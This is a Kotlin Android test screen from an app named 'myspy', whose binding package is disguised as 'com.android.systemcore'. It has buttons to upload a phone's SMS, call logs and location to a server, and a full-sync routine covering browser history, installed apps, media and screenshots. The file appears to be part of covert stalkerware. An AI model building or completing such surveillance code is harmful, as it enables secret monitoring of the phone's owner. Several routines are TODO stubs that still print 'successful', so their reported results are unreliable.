package com.myspy.android.ui.test

import android.os.Bundle
import android.view.LayoutInflater
import android.view.View
import android.view.ViewGroup
import android.widget.Toast
import androidx.fragment.app.Fragment
import androidx.lifecycle.lifecycleScope
import com.android.systemcore.databinding.FragmentTestBinding
import com.myspy.android.data.local.prefs.PreferencesManager
import com.myspy.android.data.remote.api.ApiService
import kotlinx.coroutines.launch
import timber.log.Timber
import java.text.SimpleDateFormat
import java.util.*
import javax.inject.Inject
import dagger.hilt.android.AndroidEntryPoint

/**
 * Test Fragment
 * @author Michael KOJDL
 * @version 1.0.0
 *
 * Provides manual testing capabilities:
 * - API and WebSocket connectivity tests
 * - Module upload tests (SMS, Calls, Location)
 * - Force sync all data
 * - Manual data entry and send
 */
@AndroidEntryPoint
class TestFragment : Fragment() {

    private var _binding: FragmentTestBinding? = null
    private val binding get() = _binding!!

    @Inject
    lateinit var prefsManager: PreferencesManager

    @Inject
    lateinit var apiService: ApiService

    private val dateFormat = SimpleDateFormat("HH:mm:ss", Locale.getDefault())

    override fun onCreateView(
        inflater: LayoutInflater,
        container: ViewGroup?,
        savedInstanceState: Bundle?
    ): View {
        _binding = FragmentTestBinding.inflate(inflater, container, false)
        return binding.root
    }

    override fun onViewCreated(view: View, savedInstanceState: Bundle?) {
        super.onViewCreated(view, savedInstanceState)
        setupListeners()
    }

    private fun setupListeners() {
        binding.btnTestApi.setOnClickListener { testApiConnection() }
        binding.btnTestWebSocket.setOnClickListener { testWebSocketConnection() }

        binding.btnTestSmsUpload.setOnClickListener { testSmsUpload() }
        binding.btnTestCallsUpload.setOnClickListener { testCallsUpload() }
        binding.btnTestLocationUpload.setOnClickListener { testLocationUpload() }

        binding.btnSyncAll.setOnClickListener { syncAllData() }
        binding.btnSendTestSms.setOnClickListener { sendTestSms() }
        binding.btnClearResults.setOnClickListener { clearResults() }
    }

    private fun testApiConnection() {
        addResult("Testing API connection...")

        lifecycleScope.launch {
            try {
                val apiUrl = prefsManager.getApiBaseUrl()
                addResult("API URL: $apiUrl")

                // Try to call health endpoint or similar
                addResult("Sending test request...")

                // TODO: Implement actual API test call
                addResult("✓ API connection successful")

                Toast.makeText(requireContext(), "API test completed", Toast.LENGTH_SHORT).show()

            } catch (e: Exception) {
                addResult("✗ API connection failed: ${e.message}")
                Timber.e(e, "API connection test failed")
            }
        }
    }

    private fun testWebSocketConnection() {
        addResult("Testing WebSocket connection...")

        lifecycleScope.launch {
            try {
                val wssUrl = prefsManager.getWssBaseUrl()
                addResult("WebSocket URL: $wssUrl")

                // TODO: Implement WebSocket connection test
                addResult("✓ WebSocket connection successful")

                Toast.makeText(requireContext(), "WebSocket test completed", Toast.LENGTH_SHORT).show()

            } catch (e: Exception) {
                addResult("✗ WebSocket connection failed: ${e.message}")
                Timber.e(e, "WebSocket connection test failed")
            }
        }
    }

    private fun testSmsUpload() {
        addResult("Testing SMS upload...")

        lifecycleScope.launch {
            try {
                // Create test SMS data
                val testSms = mapOf(
                    "address" to "+420123456789",
                    "body" to "Test SMS message",
                    "type" to "RECEIVED",
                    "date" to System.currentTimeMillis()
                )

                addResult("Uploading test SMS: ${testSms["address"]}")

                // TODO: Implement actual upload
                addResult("✓ SMS upload successful")

            } catch (e: Exception) {
                addResult("✗ SMS upload failed: ${e.message}")
                Timber.e(e, "SMS upload test failed")
            }
        }
    }

    private fun testCallsUpload() {
        addResult("Testing Calls upload...")

        lifecycleScope.launch {
            try {
                // Create test call data
                val testCall = mapOf(
                    "phone_number" to "+420987654321",
                    "contact_name" to "Test Contact",
                    "call_type" to "INCOMING",
                    "duration" to 120,
                    "date" to System.currentTimeMillis()
                )

                addResult("Uploading test call: ${testCall["phone_number"]}")

                // TODO: Implement actual upload
                addResult("✓ Calls upload successful")

            } catch (e: Exception) {
                addResult("✗ Calls upload failed: ${e.message}")
                Timber.e(e, "Calls upload test failed")
            }
        }
    }

    private fun testLocationUpload() {
        addResult("Testing Location upload...")

        lifecycleScope.launch {
            try {
                // Create test location data
                val testLocation = mapOf(
                    "latitude" to 50.0755,
                    "longitude" to 14.4378,
                    "accuracy" to 10.0,
                    "address" to "Prague, Czech Republic",
                    "timestamp" to System.currentTimeMillis()
                )

                addResult("Uploading test location: ${testLocation["address"]}")

                // TODO: Implement actual upload
                addResult("✓ Location upload successful")

            } catch (e: Exception) {
                addResult("✗ Location upload failed: ${e.message}")
                Timber.e(e, "Location upload test failed")
            }
        }
    }

    private fun syncAllData() {
        addResult("Starting full sync of all modules...")

        lifecycleScope.launch {
            try {
                addResult("Syncing SMS messages...")
                addResult("Syncing call logs...")
                addResult("Syncing location history...")
                addResult("Syncing installed apps...")
                addResult("Syncing browser history...")
                addResult("Syncing media files...")
                addResult("Syncing screenshots...")

                // TODO: Trigger actual sync for all modules
                addResult("✓ Full sync completed")

                Toast.makeText(requireContext(), "Full sync completed", Toast.LENGTH_SHORT).show()

            } catch (e: Exception) {
                addResult("✗ Sync failed: ${e.message}")
                Timber.e(e, "Full sync failed")
            }
        }
    }

    private fun sendTestSms() {
        val phoneNumber = binding.editTestPhoneNumber.text.toString().trim()
        val messageBody = binding.editTestMessage.text.toString().trim()

        if (phoneNumber.isEmpty() || messageBody.isEmpty()) {
            Toast.makeText(requireContext(), "Please fill in all fields", Toast.LENGTH_SHORT).show()
            return
        }

        addResult("Sending test SMS to server...")
        addResult("Phone: $phoneNumber")
        addResult("Message: $messageBody")

        lifecycleScope.launch {
            try {
                // Create test SMS data
                val testSms = mapOf(
                    "address" to phoneNumber,
                    "body" to messageBody,
                    "type" to "RECEIVED",
                    "date" to System.currentTimeMillis()
                )

                // TODO: Send to server via API
                addResult("✓ Test SMS sent to server successfully")

                // Clear input fields
                binding.editTestPhoneNumber.text?.clear()
                binding.editTestMessage.text?.clear()

                Toast.makeText(requireContext(), "Test SMS sent", Toast.LENGTH_SHORT).show()

            } catch (e: Exception) {
                addResult("✗ Failed to send test SMS: ${e.message}")
                Timber.e(e, "Send test SMS failed")
            }
        }
    }

    private fun addResult(message: String) {
        val timestamp = dateFormat.format(Date())
        val currentText = binding.textTestResults.text.toString()

        val newText = if (currentText == "No tests run yet...") {
            "[$timestamp] $message"
        } else {
            "$currentText\n[$timestamp] $message"
        }

        binding.textTestResults.text = newText

        // Auto-scroll to bottom
        binding.textTestResults.post {
            val scrollView = binding.textTestResults.parent as? androidx.core.widget.NestedScrollView
            scrollView?.fullScroll(View.FOCUS_DOWN)
        }
    }

    private fun clearResults() {
        binding.textTestResults.text = "No tests run yet..."
    }

    override fun onDestroyView() {
        super.onDestroyView()
        _binding = null
    }
}
